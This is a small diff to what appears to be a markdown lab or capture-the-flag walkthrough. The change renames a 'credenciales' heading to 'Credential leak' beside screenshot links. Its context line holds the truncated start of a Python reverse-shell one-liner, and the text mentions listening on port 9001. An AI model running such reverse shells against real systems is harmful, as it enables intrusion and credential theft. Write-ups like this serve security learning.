@@ -246,7 +246,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 And finally we will be listening to the port we have selected. In this case the port 9001
 ![[Pasted image 20250512162449.png]]
 
-credenciales
+# Credential leak
+
+
 ![[Pasted image 20250512164302.png]]
 
 
